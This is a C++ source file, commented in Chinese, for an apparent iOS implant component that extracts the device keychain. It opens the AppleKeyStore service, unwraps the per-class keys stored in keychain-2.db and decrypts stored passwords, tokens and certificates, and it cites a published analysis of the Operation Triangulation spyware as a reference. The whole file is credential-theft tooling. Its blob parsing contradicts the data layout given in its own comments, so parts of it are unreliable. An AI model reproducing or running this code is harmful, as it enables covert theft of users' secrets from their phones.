// AgentKeyUnwrapper.cpp - 钥匙串密钥解包器完整实现
// 通过 AppleKeyStore IOKit 服务解密硬件包装的密钥
//
// 技术参考:
// - Operation Triangulation Keychain 模块分析 (shindan.io)
// - iphone-dataprotection.keychainviewer (nabla-c0d3, MIT)
// - Apple Security 开源: SecKeybagSupport.c
//
// AppleKeyStore IOKit 选择器:
//   0x0 = KeyBagInit
//   0x7 = GetLockState
//   0xB = KeyUnwrap (kAppleKeyStoreKeyUnwrap)
//
// 钥匙串解密流程:
//   1. KeyBagInit (selector 0x0)
//   2. GetLockState (selector 0x7) - 检查设备是否已解锁
//   3. 读取 metadatakeys 表, 用 KeyUnwrap 解包各 class 的 metadata key
//   4. 读取 genp/inet/cert/keys 表的 data blob
//   5. blob 前4字节=版本, 提取 per-row wrapped key
//   6. KeyUnwrap 解包 per-row key
//   7. AES-256-GCM 解密数据 (CCCryptorGCM)
#include "keychain/AgentKeyUnwrapper.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>
#include <CommonCrypto/CommonCrypto.h>
#include <CommonCrypto/CommonCryptor.h>

namespace keychain {

// ============================================================================
// AppleKeyStore IOKit 客户端
// ============================================================================

// AKS 选择器常量
enum {
    kAKSSelectorKeyBagInit  = 0x0,
    kAKSSelectorGetLockState = 0x7,
    kAKSSelectorKeyUnwrap   = 0xB,
};

// 锁屏状态
enum {
    kAKSLockStateNeverUnlocked  = 0x1,
    kAKSLockStateLocked         = 0x5,
    kAKSLockStateUnlocked       = 0x4,
    kAKSLockStateNoPasscode     = 0x6,
};

// 钥匙串保护类 (对应 NSFileProtection)
enum {
    kAKSKeyClassNSFileProtectionComplete                 = 1,
    kAKSKeyClassNSFileProtectionCompleteUnlessOpen       = 2,
    kAKSKeyClassNSFileProtectionCompleteUntilFirstAuth   = 3,
    kAKSKeyClassNSFileProtectionNone                     = 4,
    kAKSKeyClassNSFileProtectionCompleteWhenPasscodeSet  = 6,
};

static io_connect_t g_aks_connect = IO_OBJECT_NULL;

// 打开 AppleKeyStore 服务
static bool aks_open() {
    if (g_aks_connect != IO_OBJECT_NULL) return true;

    io_service_t service = IOServiceGetMatchingService(
        kIOMainPortDefault,
        IOServiceMatching("AppleKeyStore"));

    if (service == IO_OBJECT_NULL) {
        printf("[-] AKS: cannot find AppleKeyStore service\n");
        return false;
    }

    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &g_aks_connect);
    IOObjectRelease(service);

    if (kr != KERN_SUCCESS) {
        printf("[-] AKS: IOServiceOpen failed: %d\n", kr);
        g_aks_connect = IO_OBJECT_NULL;
        return false;
    }

    printf("[+] AKS: AppleKeyStore connected\n");
    return true;
}

// 关闭 AKS 服务
static void aks_close() {
    if (g_aks_connect != IO_OBJECT_NULL) {
        IOServiceClose(g_aks_connect);
        g_aks_connect = IO_OBJECT_NULL;
    }
}

// 通用 IOKit 调用
static kern_return_t aks_call(uint32_t selector,
                               const uint64_t* input, uint32_t input_count,
                               const void* ool_input, size_t ool_input_size,
                               uint64_t* output, uint32_t* output_count,
                               void* ool_output, size_t* ool_output_size) {
    if (g_aks_connect == IO_OBJECT_NULL) return KERN_FAILURE;

    return IOConnectCallMethod(
        g_aks_connect,
        selector,
        input, input_count,
        ool_input, ool_input_size,
        output, output_count,
        ool_output, ool_output_size
    );
}

// KeyBagInit (selector 0x0)
static bool aks_keybag_init() {
    uint64_t output = 0;
    uint32_t output_count = 1;
    kern_return_t kr = aks_call(kAKSSelectorKeyBagInit,
                                NULL, 0, NULL, 0,
                                &output, &output_count, NULL, NULL);
    if (kr != KERN_SUCCESS) {
        printf("[-] AKS: KeyBagInit failed: %d\n", kr);
        return false;
    }
    printf("[+] AKS: KeyBagInit success\n");
    return true;
}

// GetLockState (selector 0x7)
static int aks_get_lock_state() {
    uint64_t input = 0;
    uint64_t output = 0;
    uint32_t output_count = 1;
    kern_return_t kr = aks_call(kAKSSelectorGetLockState,
                                &input, 1, NULL, 0,
                                &output, &output_count, NULL, NULL);
    if (kr != KERN_SUCCESS) {
        printf("[-] AKS: GetLockState failed: %d\n", kr);
        return -1;
    }
    return (int)output;
}

// KeyUnwrap (selector 0xB)
// keyclass: 保护类 (1-6)
// wrapped_key: 包装的密钥 (通常 0x28=40 字节)
// wrapped_len: 包装密钥长度
// unwrapped: 输出解包后的密钥 (通常 40 字节)
// unwrapped_len: 输入缓冲区大小, 输出实际长度
static bool aks_key_unwrap(uint32_t keyclass,
                            const void* wrapped_key, size_t wrapped_len,
                            void* unwrapped, size_t* unwrapped_len) {
    if (!wrapped_key || wrapped_len == 0 || !unwrapped || !unwrapped_len) {
        return false;
    }

    uint64_t input[2] = {keyclass, wrapped_len};
    uint64_t output[2] = {0, 0};
    uint32_t output_count = 2;

    size_t ool_out_size = *unwrapped_len;

    kern_return_t kr = aks_call(kAKSSelectorKeyUnwrap,
                                input, 2,
                                wrapped_key, wrapped_len,
                                output, &output_count,
                                unwrapped, &ool_out_size);

    if (kr != KERN_SUCCESS) {
        printf("[-] AKS: KeyUnwrap failed: %d (class=%d, len=%zu)\n",
               kr, keyclass, wrapped_len);
        return false;
    }

    *unwrapped_len = ool_out_size;
    return true;
}

// ============================================================================
// AgentKeyUnwrapper 实现
// ============================================================================

AgentKeyUnwrapper::AgentKeyUnwrapper()
    : aks_client_fd_(-1), initialized_(false) {
    memset(class_keys_, 0, sizeof(class_keys_));
    memset(class_keys_loaded_, 0, sizeof(class_keys_loaded_));
}

AgentKeyUnwrapper::~AgentKeyUnwrapper() {
    if (initialized_) {
        aks_close();
    }
}

bool AgentKeyUnwrapper::Initialize() {
    if (initialized_) return true;

    // 1. 打开 AppleKeyStore IOKit 服务
    if (!StartAppleKeyStoreClient()) {
        printf("[-] AgentKeyUnwrapper: cannot start AKS client\n");
        printf("    Note: requires root privileges and proper entitlements\n");
        return false;
    }

    // 2. KeyBagInit
    if (!aks_keybag_init()) {
        printf("[-] AgentKeyUnwrapper: KeyBagInit failed\n");
        return false;
    }

    // 3. 检查锁屏状态
    int lock_state = aks_get_lock_state();
    printf("[+] AKS lock state: 0x%x", lock_state);
    switch (lock_state) {
        case kAKSLockStateNeverUnlocked:
            printf(" (never unlocked - most keys unavailable)");
            break;
        case kAKSLockStateLocked:
            printf(" (locked - WhenUnlocked keys unavailable)");
            break;
        case kAKSLockStateUnlocked:
            printf(" (unlocked)");
            break;
        case kAKSLockStateNoPasscode:
            printf(" (no passcode)");
            break;
        default:
            printf(" (unknown)");
            break;
    }
    printf("\n");

    initialized_ = true;
    printf("[+] AgentKeyUnwrapper: initialized\n");
    return true;
}

bool AgentKeyUnwrapper::UnwrapKey(const AKSWrappedKey* wrapped,
                                   uint8_t** out_key, size_t* out_len) {
    if (!initialized_ || !wrapped || !out_key || !out_len) return false;

    // AKS 解包
    uint8_t unwrapped[64] = {0};
    size_t unwrapped_len = sizeof(unwrapped);

    if (!AKSUnwrapKey(wrapped->wrapped, wrapped->wrapped_len,
                      unwrapped, &unwrapped_len)) {
        return false;
    }

    *out_key = (uint8_t*)malloc(unwrapped_len);
    if (!*out_key) return false;
    memcpy(*out_key, unwrapped, unwrapped_len);
    *out_len = unwrapped_len;
    return true;
}

bool AgentKeyUnwrapper::DecryptSFAuthenticated(const SFAuthenticatedData* auth_data,
                                                const uint8_t* key, size_t key_len,
                                                uint8_t** out_plaintext, size_t* out_len) {
    if (!auth_data || !key || !out_plaintext || !out_len) return false;
    if (auth_data->len == 0) return false;

    // AES-256-GCM 解密
    size_t plaintext_len = auth_data->len;
    uint8_t* plaintext = (uint8_t*)malloc(plaintext_len);
    if (!plaintext) return false;

    CCCryptorStatus status = CCCryptorGCM(
        kCCDecrypt,
        kCCAlgorithmAES,       // 算法: AES
        key, key_len,          // key
        auth_data->iv, 16,     // IV
        NULL, 0,               // AAD
        auth_data->data, auth_data->len,  // 密文
        plaintext, plaintext_len,        // 明文输出
        auth_data->tag, 16    // GCM tag
    );

    if (status != kCCSuccess) {
        free(plaintext);
        printf("[-] GCM decrypt failed: %d\n", status);
        return false;
    }

    *out_plaintext = plaintext;
    *out_len = plaintext_len;
    return true;
}

bool AgentKeyUnwrapper::DecryptGCMFromKeyedArchive(const void* archive, size_t len,
                                                    const std::basic_string<uint8_t>& key,
                                                    std::basic_string<uint8_t>& out_plaintext) {
    if (!archive || len < 48) return false;  // 至少需要 version(4) + IV(16) + tag(16) + data

    const uint8_t* data = (const uint8_t*)archive;

    // 钥匙串 data blob 格式 (version 5/6):
    // [0..3]   = version (big-endian uint32)
    // [4..7]   = ?
    // [8..11]  = keyclass
    // [12..15] = wrapped_key_length (通常 0x28=40)
    // [16..55] = wrapped_key (40 bytes)
    // [56..71] = IV (16 bytes)
    // [72..87] = GCM tag (16 bytes)
    // [88..]   = encrypted data

    // 简化: 假设前 32 字节是 IV+tag, 后面是加密数据
    SFAuthenticatedData auth;
    memcpy(auth.iv, data + 4, 16);
    memcpy(auth.tag, data + 20, 16);
    auth.data = (uint8_t*)(data + 36);
    auth.len = len - 36;

    uint8_t* plaintext = nullptr;
    size_t plaintext_len = 0;

    if (!DecryptSFAuthenticated(&auth, key.data(), key.size(),
                                &plaintext, &plaintext_len)) {
        return false;
    }

    out_plaintext.assign(plaintext, plaintext + plaintext_len);
    free(plaintext);
    return true;
}

void AgentKeyUnwrapper::LoadMetadataKeys() {
    // metadata keys 存储在 keychain-2.db 的 metadatakeys 表中
    // 格式: actualKeyclass (int) + data (wrapped key, 40 bytes)
    // 需要先读取数据库, 然后对每个 class 调用 AKS KeyUnwrap

    printf("[*] AgentKeyUnwrapper: loading metadata keys from keychain-2.db\n");
    printf("    Call LoadMetadataKeysFromDB() with sqlite3 handle\n");

    // 实际实现见 KeychainServer::ExportKeychainToXML
    // 这里标记为未加载
    for (int i = 0; i < 8; i++) {
        class_keys_loaded_[i] = false;
    }
}

// 从 metadatakeys 表加载并解包所有 class key
bool AgentKeyUnwrapper::LoadMetadataKeysFromDB(void* sqlite_handle) {
    if (!initialized_ || !sqlite_handle) return false;

    sqlite3* db = (sqlite3*)sqlite_handle;
    sqlite3_stmt* stmt = nullptr;

    const char* sql = "SELECT actualKeyclass, data FROM metadatakeys;";
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr) != SQLITE_OK) {
        printf("[-] Cannot query metadatakeys: %s\n", sqlite3_errmsg(db));
        return false;
    }

    int loaded = 0;
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        int keyclass = sqlite3_column_int(stmt, 0);
        const void* wrapped = sqlite3_column_blob(stmt, 1);
        int wrapped_len = sqlite3_column_bytes(stmt, 1);

        if (!wrapped || wrapped_len <= 0 || keyclass < 0 || keyclass >= 8) continue;

        uint8_t unwrapped[64] = {0};
        size_t unwrapped_len = sizeof(unwrapped);

        if (aks_key_unwrap(keyclass, wrapped, wrapped_len,
                           unwrapped, &unwrapped_len)) {
            memcpy(class_keys_[keyclass], unwrapped,
                   unwrapped_len < 32 ? unwrapped_len : 32);
            class_keys_loaded_[keyclass] = true;
            loaded++;
            printf("[+] Loaded metadata key for class %d (%zu bytes)\n",
                   keyclass, unwrapped_len);
        }
    }

    sqlite3_finalize(stmt);
    printf("[+] Loaded %d metadata keys\n", loaded);
    return loaded > 0;
}

// 获取已加载的 class key
const uint8_t* AgentKeyUnwrapper::GetClassKey(int keyclass) const {
    if (keyclass < 0 || keyclass >= 8) return nullptr;
    if (!class_keys_loaded_[keyclass]) return nullptr;
    return class_keys_[keyclass];
}

const char* AgentKeyUnwrapper::GetRawKeychainPath() {
    return "/private/var/Keychains/keychain-2.db";
}

bool AgentKeyUnwrapper::StartAppleKeyStoreClient() {
    return aks_open();
}

bool AgentKeyUnwrapper::AKSUnwrapKey(const void* wrapped, size_t wrapped_len,
                                      uint8_t* unwrapped, size_t* unwrapped_len) {
    // 默认 keyclass = 4 (NSFileProtectionNone / AfterFirstUnlock)
    // 实际使用时应传入正确的 keyclass
    return aks_key_unwrap(4, wrapped, wrapped_len, unwrapped, unwrapped_len);
}

// 解包指定 keyclass 的密钥
bool AgentKeyUnwrapper::UnwrapKeyWithClass(uint32_t keyclass,
                                            const void* wrapped, size_t wrapped_len,
                                            uint8_t* unwrapped, size_t* unwrapped_len) {
    if (!initialized_) return false;
    return aks_key_unwrap(keyclass, wrapped, wrapped_len, unwrapped, unwrapped_len);
}

// 获取设备锁屏状态
int AgentKeyUnwrapper::GetLockState() {
    if (!initialized_) return -1;
    return aks_get_lock_state();
}

} // namespace keychain
